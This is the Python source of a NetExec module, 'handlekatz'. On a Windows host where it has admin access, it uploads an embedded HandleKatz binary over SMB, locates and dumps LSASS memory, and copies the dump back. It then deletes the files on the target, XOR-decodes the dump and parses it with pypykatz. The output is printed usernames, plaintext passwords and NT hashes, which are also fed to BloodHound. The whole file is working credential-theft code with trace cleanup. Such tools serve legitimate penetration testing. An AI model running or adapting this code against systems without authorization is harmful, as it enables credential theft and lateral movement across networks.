# handlekatz module for nxc python3
# author of the module : github.com/mpgn
# HandleKatz: https://github.com/codewhitesec/HandleKatz

import base64
import re
import sys

from nxc.helpers.bloodhound import add_user_bh
from nxc.paths import DATA_PATH
from pypykatz.pypykatz import pypykatz
from os.path import join


class NXCModule:
    name = "handlekatz"
    description = "Get lsass dump using handlekatz64 and parse the result with pypykatz"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        r"""
        TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
        HANDLEKATZ_PATH       Path where handlekatz.exe is on your system (default: /tmp/)
        HANDLEKATZ_EXE_NAME   Name of the handlekatz executable (default: handlekatz.exe)
        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = HANDLEKATZ_PATH)
        """
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        with open(join(DATA_PATH, ("handlekatz_module/handle.bs64"))) as handlekatz_file:
            self.handlekatz_embedded = base64.b64decode(handlekatz_file)
        self.handlekatz = "handlekatz.exe"
        self.handlekatz_path = "/tmp/"
        self.dir_result = self.handlekatz_path
        self.useembeded = True

        if "HANDLEKATZ_PATH" in module_options:
            self.handlekatz_path = module_options["HANDLEKATZ_PATH"]
            self.useembeded = False

        if "HANDLEKATZ_EXE_NAME" in module_options:
            self.handlekatz = module_options["HANDLEKATZ_EXE_NAME"]

        if "TMP_DIR" in module_options:
            self.tmp_dir = module_options["TMP_DIR"]

        if "DIR_RESULT" in module_options:
            self.dir_result = module_options["DIR_RESULT"]

    def on_admin_login(self, context, connection):
        handlekatz_loc = self.handlekatz_path + self.handlekatz
        
        if self.useembeded:
            try:
                with open(handlekatz_loc, "wb") as handlekatz:
                    handlekatz.write(self.handlekatz_embedded)
            except FileNotFoundError:
                context.log.fail(f"Handlekatz file specified '{handlekatz_loc}' does not exist!")
                sys.exit(1)

        context.log.display(f"Copy {self.handlekatz_path + self.handlekatz} to {self.tmp_dir}")

        with open(handlekatz_loc, "rb") as handlekatz:
            try:
                connection.conn.putFile(self.share, self.tmp_share + self.handlekatz, handlekatz.read)
                context.log.success(f"[OPSEC] Created file {self.handlekatz} on the \\\\{self.share}{self.tmp_share}")
            except Exception as e:
                context.log.fail(f"Error writing file to share {self.share}: {e}")

        # get LSASS PID via `tasklist`
        command = 'tasklist /v /fo csv | findstr /i "lsass"'
        context.log.display(f"Getting lsass PID via command {command}")
        p = connection.execute(command, True)
        context.log.debug(f"Command Result: {p}")
        if len(p) == 1:
            p = p[0]

        if not p or p == "None":
            context.log.fail("Failed to execute command to get LSASS PID")
            return
        # we get a CSV string back from `tasklist`, so we grab the PID from it
        pid = p.split(",")[1][1:-1]
        context.log.debug(f"pid: {pid}")

        command = self.tmp_dir + self.handlekatz + " --pid:" + pid + " --outfile:" + self.tmp_dir + "%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.log"
        context.log.display(f"Executing command {command}")

        p = connection.execute(command, True)
        context.log.debug(f"Command result: {p}")

        if "Lsass dump is complete" in p:
            context.log.success("Process lsass.exe was successfully dumped")
            dump = True
        else:
            context.log.fail("Process lsass.exe error un dump, try with verbose")
            dump = False

        if dump:
            regex = r"([A-Za-z0-9-]*\.log)"
            matches = re.search(regex, str(p), re.MULTILINE)
            if not matches:
                context.log.display("Error getting the lsass.dmp file name")
                sys.exit(1)

            machine_name = matches.group()
            context.log.display(f"Copy {machine_name} to host")

            with open(self.dir_result + machine_name, "wb+") as dump_file:
                try:
                    connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
                    context.log.success(f"Dumpfile of lsass.exe was transferred to {self.dir_result + machine_name}")
                except Exception as e:
                    context.log.fail(f"Error while get file: {e}")

            try:
                connection.conn.deleteFile(self.share, self.tmp_share + self.handlekatz)
                context.log.success(f"Deleted handlekatz file on the {self.share} share")
            except Exception as e:
                context.log.fail(f"[OPSEC] Error deleting handlekatz file on share {self.share}: {e}")

            try:
                connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
                context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
            except Exception as e:
                context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on share {self.share}: {e}")

            h_in = open(self.dir_result + machine_name, "rb")  # noqa: SIM115
            h_out = open(self.dir_result + machine_name + ".decode", "wb")  # noqa: SIM115

            bytes_in = bytearray(h_in.read())
            bytes_in_len = len(bytes_in)

            context.log.display(f"Deobfuscating, this might take a while (size: {bytes_in_len} bytes)")

            chunks = [bytes_in[i: i + 1000000] for i in range(0, bytes_in_len, 1000000)]
            for chunk in chunks:
                for i in range(len(chunk)):
                    chunk[i] ^= 0x41

                h_out.write(bytes(chunk))

            with open(self.dir_result + machine_name + ".decode", "rb") as dump:
                try:
                    credz_bh = []
                    try:
                        pypy_parse = pypykatz.parse_minidump_external(dump)
                    except Exception as e:
                        pypy_parse = None
                        context.log.fail(f"Error parsing minidump: {e}")

                    ssps = [
                        "msv_creds",
                        "wdigest_creds",
                        "ssp_creds",
                        "livessp_creds",
                        "kerberos_creds",
                        "credman_creds",
                        "tspkg_creds",
                    ]
                    for luid in pypy_parse.logon_sessions:
                        for ssp in ssps:
                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                                domain = getattr(cred, "domainname", None)
                                username = getattr(cred, "username", None)
                                password = getattr(cred, "password", None)
                                NThash = getattr(cred, "NThash", None)
                                if NThash is not None:
                                    NThash = NThash.hex()
                                if username and (password or NThash) and "$" not in username:
                                    print_pass = password if password else NThash
                                    context.log.highlight(domain + "\\" + username + ":" + print_pass)
                                    if "." not in domain and domain.upper() in connection.domain.upper():
                                        domain = connection.domain
                                        credz_bh.append(
                                            {
                                                "username": username.upper(),
                                                "domain": domain.upper(),
                                            }
                                        )
                    if len(credz_bh) > 0:
                        add_user_bh(credz_bh, None, context.log, connection.config)
                except Exception as e:
                    context.log.fail(f"Error opening dump file: {e}")
